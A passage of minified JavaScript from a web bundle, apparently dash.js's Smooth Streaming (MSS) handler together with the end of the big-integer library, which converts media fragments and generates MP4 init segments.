ha=ba.length,ka=ba[ha-1];t.prototype.shiftLeft=g.prototype.shiftLeft=f.prototype.shiftLeft=function(C){if(C=S(C).toJSNumber(),!(1e7>=Math.abs(C)))throw Error(String(C)+" is too large for shifting.");if(0>C)return this.shiftRight(-C);var fa=this;if(fa.isZero())return fa;for(;ha<=C;)fa=fa.multiply(ka),C-=ha-1;return fa.multiply(ba[C])},t.prototype.shiftRight=g.prototype.shiftRight=f.prototype.shiftRight=function(C){var fa;if(C=S(C).toJSNumber(),!(1e7>=Math.abs(C)))throw Error(String(C)+" is too large for shifting.");if(0>C)return this.shiftLeft(-C);for(var qa=this;ha<=C;){if(qa.isZero()||qa.isNegative()&&qa.isUnit())return qa;qa=(fa=ja(qa,ka))[1].isNegative()?fa[0].prev():fa[0],C-=ha-1}return(fa=ja(qa,ba[C]))[1].isNegative()?fa[0].prev():fa[0]},t.prototype.not=g.prototype.not=f.prototype.not=function(){return this.negate().prev()},t.prototype.and=g.prototype.and=f.prototype.and=function(C){return H(this,C,(function(fa,qa){return fa&qa}))},t.prototype.or=g.prototype.or=f.prototype.or=function(C){return H(this,C,(function(fa,qa){return fa|qa}))},t.prototype.xor=g.prototype.xor=f.prototype.xor=function(C){return H(this,C,(function(fa,qa){return fa^qa}))},t.prototype.bitLength=g.prototype.bitLength=f.prototype.bitLength=function(){var C=this;return 0>C.compareTo(m(0))&&(C=C.negate().subtract(m(1))),0===C.compareTo(m(0))?m(0):m(function xa(qa,va){if(0>=va.compareTo(qa)){var za=xa(qa,va.square(va)),Ca=za.p;return za=za.e,0>=(va=Ca.multiply(va)).compareTo(qa)?{p:va,e:2*za+1}:{p:Ca,e:2*za}}return{p:m(1),e:0}}(C,m(2)).e).add(m(1))},f.prototype.toArray=function(C){return T(this,C)},g.prototype.toArray=function(C){return T(this,C)},t.prototype.toArray=function(C){return T(this,C)},f.prototype.toString=function(C,fa){if(C===p&&(C=10),10!==C)return pa(this,C,fa);for(var qa=(fa=this.value).length,va=String(fa[--qa]);0<=--qa;)C=String(fa[qa]),va+="0000000".slice(C.length)+C;return(this.sign?"-":"")+va},t.prototype.toString=g.prototype.toString=function(C,fa){return C===p&&(C=10),10!=C?pa(this,C,fa):String(this.value)},t.prototype.toJSON=f.prototype.toJSON=g.prototype.toJSON=function(){return this.toString()},f.prototype.toJSNumber=f.prototype.valueOf=function(){return parseInt(this.toString(),10)},g.prototype.toJSNumber=g.prototype.valueOf=function(){return this.value},t.prototype.valueOf=t.prototype.toJSNumber=function(){return parseInt(this.toString(),10)};for(var la=0;1e3>la;la++)l[la]=S(la),0<la&&(l[-la]=S(-la));return l.one=l[1],l.zero=l[0],l.minusOne=l[-1],l.max=A,l.min=Y,l.gcd=Z,l.lcm=function(C,fa){return C=S(C).abs(),fa=S(fa).abs(),C.divide(Z(C,fa)).multiply(fa)},l.isInstance=function(C){return C instanceof f||C instanceof g||C instanceof t},l.randBetween=function(C,fa){var qa=Y(C=S(C),fa=S(fa));if((C=A(C,fa).subtract(qa).add(1)).isSmall)return qa.add(Math.floor(Math.random()*C));C=T(C,1e7).value,fa=[];for(var va=!0,xa=0;xa<C.length;xa++){var za=va?C[xa]:1e7,Ca=D(Math.random()*za);fa.push(Ca),Ca<za&&(va=!1)}return qa.add(l.fromArray(fa,1e7,!1))},l.fromArray=function(C,fa,qa){return na(C.map(S),S(fa||10),qa)},l}();void 0!==M&&M.hasOwnProperty("exports")&&(M.exports=m),"function"==typeof define&&define.amd&&define("big-integer",[],(function(){return m}))},{}],2:[function(da,M,v){function m(r,x){for(var z in f){var J=f[z];if(J.context===r&&J.name===x)return J.instance}return null}function p(r,x,z){var J=void 0,E=r.__dashjs_factory_name,D=x[E];if(D){var I=D.instance;if(!D.override)return I.apply({context:x,factory:l},z);for(var L in J=r.apply({context:x},z),I=I.apply({context:x,factory:l,parent:J},z))J.hasOwnProperty(L)&&(J[L]=I[L])}else J=r.apply({context:x},z);return J.getClassName=function(){return E},J}var l,f,g,t;Object.defineProperty(v,"__esModule",{value:!0}),l=void 0,f=[],g={},t={},da=l={extend:function(r,x,z,J){!J[r]&&x&&(J[r]={instance:x,override:z})},getSingletonInstance:m,setSingletonInstance:function(r,x,z){for(var J in f){var E=f[J];if(E.context===r&&E.name===x)return void(f[J].instance=z)}f.push({name:x,context:r,instance:z})},getSingletonFactory:function(r){var x=g[r.__dashjs_factory_name];return x||(x=function(z){var J=void 0;return void 0===z&&(z={}),{getInstance:function(){return(J=J||m(z,r.__dashjs_factory_name))||(J=p(r,z,arguments),f.push({name:r.__dashjs_factory_name,context:z,instance:J})),J}}},g[r.__dashjs_factory_name]=x),x},getSingletonFactoryByName:function(r){return g[r]},updateSingletonFactory:function(r,x){r in g&&(g[r]=x)},getClassFactory:function(r){var x=t[r.__dashjs_factory_name];return x||(x=function(z){return void 0===z&&(z={}),{create:function(){return p(r,z,arguments)}}},t[r.__dashjs_factory_name]=x),x},getClassFactoryByName:function(r){return t[r]},updateClassFactory:function(r,x){r in t&&(t[r]=x)}},v.default=da,M.exports=v.default},{}],3:[function(da,M,v){function m(l,f){for(var g=0;g<f.length;g++){var t=f[g];t.enumerable=t.enumerable||!1,t.configurable=!0,"value"in t&&(t.writable=!0),Object.defineProperty(l,t.key,t)}}function p(){if(!(this instanceof p))throw new TypeError("Cannot call a class as a function")}var l,f;Object.defineProperty(v,"__esModule",{value:!0}),l=p,f=[{key:"extend",value:function(l,f){if(l){var g=!!f&&f.override;for(var t in f=!!f&&f.publicOnly,l)!l.hasOwnProperty(t)||this[t]&&!g||f&&-1===l[t].indexOf("public_")||(this[t]=l[t])}}}],f&&m(l.prototype,f),da=p,v.default=da,M.exports=v.default},{}],4:[function(da,M,v){function m(l,f){for(var g=0;g<f.length;g++){var t=f[g];t.enumerable=t.enumerable||!1,t.configurable=!0,"value"in t&&(t.writable=!0),Object.defineProperty(l,t.key,t)}}function p(){if(!(this instanceof p))throw new TypeError("Cannot call a class as a function")}var l,f;Object.defineProperty(v,"__esModule",{value:!0}),l=p,f=[{key:"extend",value:function(l,f){if(l){var g=!!f&&f.override;for(var t in f=!!f&&f.publicOnly,l)!l.hasOwnProperty(t)||this[t]&&!g||f&&-1===l[t].indexOf("public_")||(this[t]=l[t])}}}],f&&m(l.prototype,f),da=p,v.default=da,M.exports=v.default},{}],5:[function(da,M,v){function m(f){function g(){J&&(x.debug("Stop"),clearTimeout(D),J=!1,L=I=null)}function t(){var h,F,P,O;if(J){var R=(P=(F=(h=N.getRepresentationController().getCurrentRepresentation()).adaptation.period.mpd.manifest.Period_asArray[h.adaptation.period.index].AdaptationSet_asArray[h.adaptation.index]).SegmentTemplate.SegmentTimeline.S_asArray)[P.length-1];P=F.SegmentTemplate.timescale,(O=new l.default).mediaType=E,O.type="FragmentInfoSegment",O.startTime=R.t/P,O.duration=R.d/P,O.timescale=P,O.quality=h.index,O.index=G++,O.mediaInfo=N.getMediaInfo(),O.adaptationIndex=h.adaptation.index,O.representationId=h.id,O.url=w.resolve(h.path).url+F.SegmentTemplate.media,O.url=O.url.replace("$Bandwidth$",h.bandwidth),O.url=O.url.replace("$Time$",R.tManifest?R.tManifest:R.t),O.url=O.url.replace("/Fragments(","/FragmentInfo("),N.getFragmentModel().isFragmentLoadedOrPending(O)?(x.debug("End of timeline"),g()):z.executeRequest(O)}}var r,x=void 0,z=void 0,J=void 0,E=void 0,D=void 0,I=void 0,L=void 0,G=void 0,N=(f=f||{}).streamProcessor,w=f.baseURLController;return f=f.debug,r={initialize:function(){E=N.getType(),z=N.getFragmentModel(),J=!1,L=I=null},controllerType:"MssFragmentInfoController",start:function(){J||(x.debug("Start"),J=!0,I=(new Date).getTime(),G=0,t())},fragmentInfoLoaded:function(h){var F,P,O,R;J&&(F=h.request,h.response?(L=L||F.startTime,O=((new Date).getTime()-I)/1e3,P=F.startTime+F.duration-L,R=Math.max(0,P-O),clearTimeout(D),D=setTimeout((function(){D=null,t()}),1e3*R)):x.error("Load error",F.url))},getType:function(){return E},reset:function(){g()}},x=f.getLogger(r),r}Object.defineProperty(v,"__esModule",{value:!0});var p,l=(p=da(17))&&p.__esModule?p:{default:p};m.__dashjs_factory_name="MssFragmentInfoController",v.default=Na.FactoryMaker.getClassFactory(m),M.exports=v.default},{17:17}],6:[function(da,M,v){function m(t){return t&&t.__esModule?t:{default:t}}function p(t){function r(h,F,P,O){var R=O.getRepresentationController(),Q=R.getCurrentRepresentation(),ja=Q.adaptation.period.mpd.manifest,W=ja.Period_asArray[Q.adaptation.period.index].AdaptationSet_asArray[Q.adaptation.index],aa=W.SegmentTemplate.timescale;if(E=O.getType(),"dynamic"===ja.type||ja.timeShiftBufferDepth)if(F){var ma,H;W=W.SegmentTemplate.SegmentTimeline.S;var B=F.entry,A=void 0,Y=void 0;if(F=null,0!==B.length&&(ma=B[0],!("static"===ja.type&&(A=W[0].tManifest?parseFloat(W[0].tManifest):W[0].t,ma.fragment_absolute_time>A+ja.timeShiftBufferDepth*aa)))){if(A=W[W.length-1].tManifest?parseFloat(W[W.length-1].tManifest):W[W.length-1].t,ma.fragment_absolute_time<=A)return Y={start:W[0].t/aa,end:P.baseMediaDecodeTime/aa+h.duration},void x(h.mediaType,Y,O.getStreamInfo().manifestInfo);if((F={}).t=ma.fragment_absolute_time,F.d=ma.fragment_duration,W[0].tManifest&&(F.t-=parseFloat(W[0].tManifest)-W[0].t,F.tManifest=ma.fragment_absolute_time),W.push(F),"static"!==ja.type){if(ja.timeShiftBufferDepth&&0<ja.timeShiftBufferDepth){for(ma=W[W.length-1].t,ja=Math.round((ma-ja.timeShiftBufferDepth*aa)/aa),F=W[0];Math.round(F.t/aa)<ja;)W.splice(0,1),F=W[0];Y={start:W[0].t/aa,end:P.baseMediaDecodeTime/aa+h.duration},x(E,Y,O.getStreamInfo().manifestInfo)}R.updateRepresentation(Q,!0)}else"video"!==E||(H=((F=W[W.length-1]).t+F.d)/aa)>Q.adaptation.period.duration&&N.trigger(g.default.MANIFEST_VALIDITY_CHANGED,{sender:this,newDuration:H})}}else G.error(new l.default(f.default.MSS_NO_TFRF_CODE,f.default.MSS_NO_TFRF_MESSAGE))}function x(h,F,P){var O=I.getCurrentDVRInfo(h);(!O||F.end>O.range.end)&&(D.debug("Update DVR range: ["+F.start+" - "+F.end+"]"),I.addDVRInfo(h,L.getTime(),P,F))}function z(h,F){var O,P=8;for(O=0;O<h.boxes.length&&h.boxes[O].type!==F;O++)P+=h.boxes[O].size;return P}var J,E=void 0,D=void 0,I=(t=t||{}).dashMetrics,L=t.playbackController,G=t.errHandler,N=t.eventBus,w=t.ISOBoxer;return t=t.debug,J={convertFragment:function(h,F){var P=w.parseBuffer(h.response),O=P.fetch("tfhd");O.track_ID=h.request.mediaInfo.index+1;var R=P.fetch("tfdt"),Q=P.fetch("traf");null===R&&((R=w.createFullBox("tfdt",Q,O)).version=1,R.flags=0,R.baseMediaDecodeTime=Math.floor(h.request.startTime*h.request.timescale));var aa,ma,ja=P.fetch("trun"),W=P.fetch("tfxd");if(W&&W._parent.boxes.splice(W._parent.boxes.indexOf(W),1),W=P.fetch("tfrf"),r(h.request,W,R,F),W&&W._parent.boxes.splice(W._parent.boxes.indexOf(W),1),null!==(F=P.fetch("sepiff"))&&(F.type="senc",F.usertype=void 0,null===(R=P.fetch("saio"))))if((R=w.createFullBox("saio",Q)).version=0,R.flags=0,R.entry_count=1,R.offset=[0],(W=w.createFullBox("saiz",Q)).version=0,W.flags=0,W.sample_count=F.sample_count,W.default_sample_info_size=0,W.sample_info_size=[],2&F.flags)for(R=0;R<F.sample_count;R+=1)W.sample_info_size[R]=10+6*F.entry[R].NumberOfEntries;else W.default_sample_info_size=8;O.flags&=16777214,O.flags|=131072,ja.flags|=1,F=(O=P.fetch("moof")).getLength(),ja.data_offset=F+8,null!==(ja=P.fetch("saio"))&&(aa=z(O,"traf"),ma=z(Q,"senc"),ja.offset[0]=aa+ma+16),h.response=P.write()},updateSegmentList:function(h,F){if(!h.response)throw Error("e.response parameter is missing");var P=w.parseBuffer(h.response),O=P.fetch("tfhd");O.track_ID=h.request.mediaInfo.index+1;var R=P.fetch("tfdt"),Q=P.fetch("traf");null===R&&((R=w.createFullBox("tfdt",Q,O)).version=1,R.flags=0,R.baseMediaDecodeTime=Math.floor(h.request.startTime*h.request.timescale)),P=P.fetch("tfrf"),r(h.request,P,R,F),P&&P._parent.boxes.splice(P._parent.boxes.indexOf(P),1)},getType:function(){return E}},D=t.getLogger(J),E="",J}Object.defineProperty(v,"__esModule",{value:!0});var l=m(da(15)),f=m(da(10)),g=m(da(13));p.__dashjs_factory_name="MssFragmentMoofProcessor",v.default=Na.FactoryMaker.getClassFactory(p),M.exports=v.default},{10:10,13:13,15:15}],7:[function(da,M,v){function m(f){function t(F,P){F=E.createBox("frma",F);var R,O=0;for(R=0;R<P.length;R+=1)O|=P.charCodeAt(R)<<8*(P.length-R-1);F.data_format=O}function r(F){(F=E.createFullBox("schm",F)).flags=0,F.version=0,F.scheme_type=1667591779,F.scheme_version=65536}function x(F){F=E.createBox("schi",F),(F=E.createFullBox("tenc",F)).flags=0,F.version=0,F.default_IsEncrypted=1,F.default_IV_size=8,F.default_KID=N&&0<N.length&&N[0]["cenc:default_KID"]?N[0]["cenc:default_KID"]:[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]}function z(F){var O,P=new Uint8Array(F.length/2);for(O=0;O<F.length/2;O+=1)P[O]=parseInt(""+F[2*O]+F[2*O+1],16);return P}var J=(f=f||{}).constants,E=f.ISOBoxer,D=f.protectionController,I=void 0,L=void 0,G=void 0,N=void 0,w=void 0,h=void 0;return{generateMoov:function(F){if(F&&F.adaptation){var P,O,R=void 0;return L=(G=F).adaptation,I=L.period,h=L.index+1,N=I.mpd.manifest.Period_asArray[I.index].AdaptationSet_asArray[L.index].ContentProtection,w=I.mpd.manifest.Period_asArray[I.index].AdaptationSet_asArray[L.index].SegmentTemplate.timescale,P=R=E.createFile(),(O=E.createBox("ftyp",P)).major_brand="iso6",O.minor_version=1,O.compatible_brands=[],O.compatible_brands[0]="isom",O.compatible_brands[1]="iso6",O.compatible_brands[2]="msdh",function g(F){var P;F=E.createBox("moov",F),(P=E.createFullBox("mvhd",F)).version=1,P.creation_time=0,P.modification_time=0,P.timescale=w,P.duration=I.duration===1/0?0x10000000000000000:Math.round(I.duration*w),P.rate=1,P.volume=1,P.reserved1=0,P.reserved2=[0,0],P.matrix=[1,0,0,0,1,0,0,0,16384],P.pre_defined=[0,0,0,0,0,0],P.next_track_ID=h+1;var O=E.createBox("trak",F);switch((P=E.createFullBox("tkhd",O)).version=1,P.flags=7,P.creation_time=0,P.modification_time=0,P.track_ID=h,P.reserved1=0,P.duration=I.duration===1/0?0x10000000000000000:Math.round(I.duration*w),P.reserved2=[0,0],P.layer=0,P.alternate_group=0,P.volume=1,P.reserved3=0,P.matrix=[1,0,0,0,1,0,0,0,16384],P.width=G.width,P.height=G.height,O=E.createBox("mdia",O),(P=E.createFullBox("mdhd",O)).version=1,P.creation_time=0,P.modification_time=0,P.timescale=w,P.duration=I.duration===1/0?0x10000000000000000:Math.round(I.duration*w),P.language=L.lang||"und",P.pre_defined=0,function(R){switch((R=E.createFullBox("hdlr",R)).pre_defined=0,L.type){case J.VIDEO:R.handler_type="vide";break;case J.AUDIO:R.handler_type="soun";break;default:R.handler_type="meta"}R.name=G.id,R.reserved=[0,0,0]}(O),P=E.createBox("minf",O),L.type){case J.VIDEO:(O=E.createFullBox("vmhd",P)).flags=1,O.graphicsmode=0,O.opcolor=[0,0,0];break;case J.AUDIO:(O=E.createFullBox("smhd",P)).flags=1,O.balance=0,O.reserved=0}!function(R){(R=E.createFullBox("dref",R)).entry_count=1,R.entries=[];var Q=E.createFullBox("url ",R,!1);Q.location="",Q.flags=1,R.entries.push(Q)}(E.createBox("dinf",P)),P=E.createBox("stbl",P),E.createFullBox("stts",P)._data=[0,0,0,0,0,0,0,0],E.createFullBox("stsc",P)._data=[0,0,0,0,0,0,0,0],E.createFullBox("stco",P)._data=[0,0,0,0,0,0,0,0],E.createFullBox("stsz",P)._data=[0,0,0,0,0,0,0,0,0,0,0,0],function(R){switch((R=E.createFullBox("stsd",R)).entries=[],L.type){case J.VIDEO:case J.AUDIO:R.entries.push(function(Q){var ja=G.codecs.substring(0,G.codecs.indexOf("."));switch(ja){case"avc1":return function(W,aa){var ma;(W=N?E.createBox("encv",W,!1):E.createBox("avc1",W,!1)).reserved1=[0,0,0,0,0,0],W.data_reference_index=1,W.pre_defined1=0,W.reserved2=0,W.pre_defined2=[0,0,0],W.height=G.height,W.width=G.width,W.horizresolution=72,W.vertresolution=72,W.reserved3=0,W.frame_count=1,W.compressorname=[10,65,86,67,32,67,111,100,105,110,103,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0],W.depth=24,W.pre_defined3=65535;for(var H=15,B=[],A=[],Y=0,Z=0,na=0,T=G.codecPrivateData.split("00000001").slice(1),pa=void 0,ia=0;ia<T.length;ia++)switch(pa=z(T[ia]),31&pa[0]){case 7:B.push(pa),H+=pa.length+2;break;case 8:A.push(pa),H+=pa.length+2}for(0<B.length&&(Y=B[0][1],na=B[0][2],Z=B[0][3]),pa=0,(T=new Uint8Array(H))[pa++]=(4278190080&H)>>24,T[pa++]=(16711680&H)>>16,T[pa++]=(65280&H)>>8,T[pa++]=255&H,T.set([97,118,99,67],pa),pa+=4,T[pa++]=1,T[pa++]=Y,T[pa++]=na,T[pa++]=Z,T[pa++]=255,T[pa++]=224|B.length,H=0;H<B.length;H++)T[pa++]=(65280&B[H].length)>>8,T[pa++]=255&B[H].length,T.set(B[H],pa),pa+=B[H].length;for(T[pa++]=A.length,H=0;H<A.length;H++)T[pa++]=(65280&A[H].length)>>8,T[pa++]=255&A[H].length,T.set(A[H],pa),pa+=A[H].length;return W.config=T,N&&(t(ma=E.createBox("sinf",W),aa),r(ma),x(ma)),W}(Q,ja);case"mp4a":return function(W,aa){var ma;(W=N?E.createBox("enca",W,!1):E.createBox("mp4a",W,!1)).reserved1=[0,0,0,0,0,0],W.data_reference_index=1,W.reserved2=[0,0],W.channelcount=G.audioChannels,W.samplesize=16,W.pre_defined=0,W.reserved_3=0,W.samplerate=G.audioSamplingRate<<16;var H=z(G.codecPrivateData),B=34+H.length,A=new Uint8Array(B),Y=0;return A[Y++]=(4278190080&B)>>24,A[Y++]=(16711680&B)>>16,A[Y++]=(65280&B)>>8,A[Y++]=255&B,A.set([101,115,100,115],Y),Y+=4,A.set([0,0,0,0],Y),Y+=4,A[Y++]=3,A[Y++]=20+H.length,A[Y++]=(65280&h)>>8,A[Y++]=255&h,A[Y++]=0,A[Y++]=4,A[Y++]=15+H.length,A[Y++]=64,A[Y]=20,A[Y]|=0,A[Y++]|=1,A[Y++]=255,A[Y++]=255,A[Y++]=255,A[Y++]=(4278190080&G.bandwidth)>>24,A[Y++]=(16711680&G.bandwidth)>>16,A[Y++]=(65280&G.bandwidth)>>8,A[Y++]=255&G.bandwidth,A[Y++]=(4278190080&G.bandwidth)>>24,A[Y++]=(16711680&G.bandwidth)>>16,A[Y++]=(65280&G.bandwidth)>>8,A[Y++]=255&G.bandwidth,A[Y++]=5,A[Y++]=H.length,A.set(H,Y),H=A,W.esds=H,N&&(t(ma=E.createBox("sinf",W),aa),r(ma),x(ma)),W}(Q,ja);default:throw{code:l.default.MSS_UNSUPPORTED_CODEC_CODE,message:l.default.MSS_UNSUPPORTED_CODEC_MESSAGE,data:{codec:ja}}}}(R))}R.entry_count=R.entries.length}(P),P=E.createBox("mvex",F),(P=E.createFullBox("trex",P)).track_ID=h,P.default_sample_description_index=1,P.default_sample_duration=0,P.default_sample_size=0,P.default_sample_flags=0,N&&D&&function(R,Q){var aa,ja=void 0,W=void 0;for(aa=0;aa<Q.length;aa+=1)(ja=Q[aa].initData)&&(W=E.parseBuffer(ja).fetch("pssh"))&&E.Utils.appendBox(R,W)}(F,D.getSupportedKeySystemsFromContentProtection(N))}(R),R.write()}}}}Object.defineProperty(v,"__esModule",{value:!0});var p,l=(p=da(10))&&p.__esModule?p:{default:p};m.__dashjs_factory_name="MssFragmentMoovProcessor",v.default=Na.FactoryMaker.getClassFactory(m),M.exports=v.default},{10:10}],8:[function(da,M,v){function m(J){return J&&J.__esModule?J:{default:J}}function p(J,E){return J.length===E.length&&J.every((function(D,I){return D===E[I]}))}function l(){this._procFullBox(),1&this.flags&&(this._procField("aux_info_type","uint",32),this._procField("aux_info_type_parameter","uint",32)),this._procField("entry_count","uint",32),this._procFieldArray("offset",this.entry_count,"uint",1===this.version?64:32)}function f(){this._procFullBox(),1&this.flags&&(this._procField("aux_info_type","uint",32),this._procField("aux_info_type_parameter","uint",32)),this._procField("default_sample_info_size","uint",8),this._procField("sample_count","uint",32),0===this.default_sample_info_size&&this._procFieldArray("sample_info_size",this.sample_count,"uint",8)}function g(){this._procFullBox(),this._procField("sample_count","uint",32),1&this.flags&&this._procField("IV_size","uint",8),this._procEntries("entry",this.sample_count,(function(J){this._procEntryField(J,"InitializationVector","data",8),2&this.flags&&(this._procEntryField(J,"NumberOfEntries","uint",16),this._procSubEntries(J,"clearAndCryptedData",J.NumberOfEntries,(function(E){this._procEntryField(E,"BytesOfClearData","uint",16),this._procEntryField(E,"BytesOfEncryptedData","uint",32)})))}))}function t(){p(this.usertype,[109,29,155,5,66,213,68,230,128,226,20,29,175,247,87,178])&&(this._procFullBox(),this._parsing&&(this.type="tfxd"),this._procField("fragment_absolute_time","uint",1===this.version?64:32),this._procField("fragment_duration","uint",1===this.version?64:32)),p(this.usertype,[212,128,126,242,202,57,70,149,142,84,38,203,158,70,167,159])&&(this._procFullBox(),this._parsing&&(this.type="tfrf"),this._procField("fragment_count","uint",8),this._procEntries("entry",this.fragment_count,(function(J){this._procEntryField(J,"fragment_absolute_time","uint",1===this.version?64:32),this._procEntryField(J,"fragment_duration","uint",1===this.version?64:32)}))),p(this.usertype,[162,57,79,82,90,155,79,20,162,68,108,66,124,100,141,244])&&(this._parsing&&(this.type="sepiff"),g.call(this))}function r(J){J=J||{};var E,D=this.context,I=J.dashMetrics,L=J.playbackController,G=J.eventBus,N=J.protectionController,w=J.ISOBoxer,h=J.debug,F=void 0,P=void 0;return E={generateMoov:function(O){return F.generateMoov(O)},processFragment:function(O,R){if(!O||!O.request||!O.response)throw Error("e parameter is missing or malformed");"MediaSegment"===O.request.type?P.convertFragment(O,R):"FragmentInfoSegment"===O.request.type&&(P.updateSegmentList(O,R),O.sender=null)}},w.addBoxProcessor("uuid",t),w.addBoxProcessor("saio",l),w.addBoxProcessor("saiz",f),w.addBoxProcessor("senc",g),F=(0,z.default)(D).create({protectionController:N,constants:J.constants,ISOBoxer:w}),P=(0,x.default)(D).create({dashMetrics:I,playbackController:L,ISOBoxer:w,eventBus:G,debug:h,errHandler:J.errHandler}),E}Object.defineProperty(v,"__esModule",{value:!0});var x=m(da(6)),z=m(da(7));r.__dashjs_factory_name="MssFragmentProcessor",v.default=Na.FactoryMaker.getClassFactory(r),M.exports=v.default},{6:6,7:7}],9:[function(da,M,v){function m(E){return E&&E.__esModule?E:{default:E}}function p(E){function D(na){return ma.getActiveStreamProcessors().filter((function(T){return T.getType()===na}))[0]}function I(na){return Y.filter((function(T){return T.getType()===na}))[0]}function L(){ma.getActiveStreamProcessors().forEach((function(na){var T;na.getType()!==Q.VIDEO&&na.getType()!==Q.AUDIO&&na.getType()!==Q.FRAGMENTED_TEXT||((T=I(na.getType()))||((T=(0,g.default)(P).create({streamProcessor:na,baseURLController:E.baseURLController,debug:E.debug})).initialize(),Y.push(T)),T.start())}))}function G(na){var T=D(na.sender.getType());if(T){var pa=T.getRepresentationController().getCurrentRepresentation();T=T.getMediaInfo();var S,V,oa,ia=new f.default;ia.mediaType=pa.adaptation.type,ia.type=ja,ia.range=pa.range,ia.quality=pa.index,ia.mediaInfo=T,ia.representationId=pa.id,S=T.streamInfo.id,V=na.type!==R.FRAGMENT_LOADING_PROGRESS,(oa=new l.default).streamId=S,oa.mediaInfo=ia.mediaInfo,oa.segmentType=ia.type,oa.start=ia.startTime,oa.duration=ia.duration,oa.end=oa.start+oa.duration,oa.index=ia.index,oa.quality=ia.quality,oa.representationId=ia.representationId,oa.endFragment=V,T=oa;try{T.bytes=B.generateMoov(pa),O.trigger(R.INIT_FRAGMENT_LOADED,{chunk:T})}catch(ba){E.errHandler.error(new z.default(ba.code,ba.message,ba.data))}na.sender=null}}function N(na){var T,pa,ia;na.error||(T=D(na.request.mediaType))&&(B.processFragment(na,T),"FragmentInfoSegment"!==na.request.type||(pa=I(na.request.mediaType))&&pa.fragmentInfoLoaded(na),(ia=na.request.mediaInfo.streamInfo.manifestInfo).isDynamic||ia.DVRWindowSize===1/0||L())}function w(){aa.getIsDynamic()&&0!==aa.getTime()&&L()}function h(){aa.getIsDynamic()&&0!==aa.getTime()&&L()}function F(na){na&&na.data&&(na.data=na.data.replace(/http:\/\/www.w3.org\/2006\/10\/ttaf1/gi,"http://www.w3.org/ns/ttml"))}E=E||{};var P=this.context,O=E.eventBus,R=E.events,Q=E.constants,ja=E.initSegmentType,W=E.dashMetrics,aa=E.playbackController,ma=E.streamController,H=E.protectionController,B=(0,t.default)(P).create({dashMetrics:W,playbackController:aa,protectionController:H,streamController:ma,eventBus:O,constants:Q,ISOBoxer:E.ISOBoxer,debug:E.debug,errHandler:E.errHandler}),A=void 0,Y=void 0,Z=void 0;return Z={reset:function(){A&&(A.reset(),A=void 0),O.off(R.INIT_FRAGMENT_NEEDED,G,this),O.off(R.PLAYBACK_PAUSED,w,this),O.off(R.PLAYBACK_SEEK_ASKED,h,this),O.off(R.FRAGMENT_LOADING_COMPLETED,N,this),O.off(R.TTML_TO_PARSE,F,this),Y.forEach((function(na){na.reset()})),Y=[]},createMssParser:function(){return A=(0,r.default)(P).create(E)},registerEvents:function(){O.on(R.INIT_FRAGMENT_NEEDED,G,Z,Na.FactoryMaker.getSingletonFactoryByName(O.getClassName()).EVENT_PRIORITY_HIGH),O.on(R.PLAYBACK_PAUSED,w,Z,Na.FactoryMaker.getSingletonFactoryByName(O.getClassName()).EVENT_PRIORITY_HIGH),O.on(R.PLAYBACK_SEEK_ASKED,h,Z,Na.FactoryMaker.getSingletonFactoryByName(O.getClassName()).EVENT_PRIORITY_HIGH),O.on(R.FRAGMENT_LOADING_COMPLETED,N,Z,Na.FactoryMaker.getSingletonFactoryByName(O.getClassName()).EVENT_PRIORITY_HIGH),O.on(R.TTML_TO_PARSE,F,Z)}},Y=[],(0,J.default)(P).getInstance(),Z}Object.defineProperty(v,"__esModule",{value:!0});var l=m(da(16)),f=m(da(17)),g=m(da(5)),t=m(da(8)),r=m(da(12)),x=m(da(10)),z=m(da(15)),J=m(da(14));p.__dashjs_factory_name="MssHandler",(da=Na.FactoryMaker.getClassFactory(p)).errors=x.default,Na.FactoryMaker.updateClassFactory(p.__dashjs_factory_name,da),v.default=da,M.exports=v.default},{10:10,12:12,14:14,15:15,16:16,17:17,5:5,8:8}],10:[function(da,M,v){function m(){if(!(this instanceof m))throw new TypeError("Cannot call a class as a function");a:{for(var p=Object.getPrototypeOf(m.prototype),l="constructor",f=this,g=!0;g;){if(null===p&&(p=Function.prototype),void 0!==(g=Object.getOwnPropertyDescriptor(p,l))){if("value"in g){f=g.value;break a}if(void 0===(l=g.get))break;f=l.call(f);break a}if(null===(p=Object.getPrototypeOf(p)))break;g=!0}f=void 0}f.call(this),this.MSS_NO_TFRF_CODE=200,this.MSS_UNSUPPORTED_CODEC_CODE=201,this.MSS_NO_TFRF_MESSAGE="Missing tfrf in live media segment",this.MSS_UNSUPPORTED_CODEC_MESSAGE="Unsupported codec"}Object.defineProperty(v,"__esModule",{value:!0}),da=new(function(p,l){if("function"!=typeof l&&null!==l)throw new TypeError("Super expression must either be null or a function, not "+typeof l);p.prototype=Object.create(l&&l.prototype,{constructor:{value:p,enumerable:!1,writable:!0,configurable:!0}}),l&&(Object.setPrototypeOf?Object.setPrototypeOf(p,l):p.__proto__=l)}(m,((da=da(3))&&da.__esModule?da:{default:da}).default),m),v.default=da,M.exports=v.default},{3:3}],11:[function(da,M,v){var m;M="undefined"!=typeof global?global:"undefined"!=typeof self?self:void 0!==wa?wa:{},Object.defineProperty(v,"__esModule",{value:!0}),da=(m=da(9))&&m.__esModule?m:{default:m},(M=(M=(m=void 0!==wa&&wa||M).dashjs)||(m.dashjs={})).MssHandler=da.default,v.default=M,v.MssHandler=da.default},{9:9}],12:[function(da,M,v){function m(f){function t(O,R,Q){var ja=O[R];O[R]=O[Q],O[Q]=ja}var r,x=(f=f||{}).BASE64,z=f.debug,J=f.constants,E=f.manifestModel,D=f.mediaPlayerModel,I=f.settings,L="AAC AACL AVC1 H264 TTML DFXP".split(" "),G={CAPT:"main",SUBT:"alternate",DESC:"main"},N={DESC:"2"},w={96e3:0,88200:1,64e3:2,48e3:3,44100:4,32e3:5,24e3:6,22050:7,16e3:8,12e3:9,11025:10,8e3:11,7350:12},h={video:"video/mp4",audio:"audio/mp4",text:"application/mp4"},F=void 0,P=void 0;return r={parse:function(O){var R=wa.performance.now(),Q=null;if(wa.DOMParser&&0<(Q=(new wa.DOMParser).parseFromString(O,"text/xml")).getElementsByTagName("parsererror").length)throw Error("parsing the manifest failed");var ja=Q;if(O=wa.performance.now(),null===ja)return null;var W=new Date;Q={};var A,pa,ia,aa=[],ma=ja.getElementsByTagName("SmoothStreamingMedia")[0],H=ja.getElementsByTagName("Protection")[0],B=null,Y=void 0,Z=void 0,na=void 0,T=void 